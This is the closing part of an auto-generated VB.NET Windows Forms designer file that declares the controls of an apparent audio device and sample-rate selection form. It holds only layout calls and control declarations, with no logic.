        Me.TabPage2.ResumeLayout(False)
        CType(Me.Guna2CirclePictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.Guna2CirclePictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.Guna2CirclePictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Painel_Teclado1.ResumeLayout(False)
        Me.Guna2Panel1.ResumeLayout(False)
        Me.Guna2Panel1.PerformLayout()
        CType(Me.Guna2PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Guna2Panel2.ResumeLayout(False)
        Me.Guna2Panel2.PerformLayout()
        CType(Me.Guna2PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents Panel1 As Panel
    Friend WithEvents Label2 As Label
    Friend WithEvents OutHZ As ComboBox
    Friend WithEvents Label1 As Label
    Friend WithEvents OutBoxSource As ComboBox
    Friend WithEvents Panel2 As Panel
    Friend WithEvents DeviceSOurVictim As ComboBox
    Friend WithEvents Label3 As Label
    Friend WithEvents inHZ As ComboBox
    Friend WithEvents InBoxSource As ComboBox
    Friend WithEvents TOpacity As Timer
    Friend WithEvents LAB_ERR As Label
    Friend WithEvents TabControl1 As TabControl
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents ImageList1 As ImageList
    Friend WithEvents Label5 As Label
    Friend WithEvents Label4 As Label
    Friend WithEvents Guna2AnimateWindow1 As Guna.UI2.WinForms.Guna2AnimateWindow
    Friend WithEvents Guna2BorderlessForm1 As Guna.UI2.WinForms.Guna2BorderlessForm
    Friend WithEvents Guna2CirclePictureBox3 As Guna.UI2.WinForms.Guna2CirclePictureBox
    Friend WithEvents Guna2CirclePictureBox2 As Guna.UI2.WinForms.Guna2CirclePictureBox
    Friend WithEvents Guna2CirclePictureBox1 As Guna.UI2.WinForms.Guna2CirclePictureBox
    Friend WithEvents Painel_Teclado1 As Guna.UI2.WinForms.Guna2Panel
    Friend WithEvents Guna2DragControl1 As Guna.UI2.WinForms.Guna2DragControl
    Friend WithEvents Guna2Panel1 As Guna.UI2.WinForms.Guna2Panel
    Friend WithEvents Guna2Panel2 As Guna.UI2.WinForms.Guna2Panel
    Friend WithEvents b_sta As Guna.UI2.WinForms.Guna2Button
    Friend WithEvents bIN As Guna.UI2.WinForms.Guna2Button
    Friend WithEvents Guna2PictureBox2 As Guna.UI2.WinForms.Guna2PictureBox
    Friend WithEvents Label6 As Label
    Friend WithEvents Label19 As Label
    Friend WithEvents Guna2PictureBox1 As Guna.UI2.WinForms.Guna2PictureBox
    Friend WithEvents Label8 As Label
    Friend WithEvents Label7 As Label
    Friend WithEvents Guna2HtmlLabel1 As Guna.UI2.WinForms.Guna2HtmlLabel
    Friend WithEvents Guna2HtmlLabel71 As Guna.UI2.WinForms.Guna2HtmlLabel
End Class
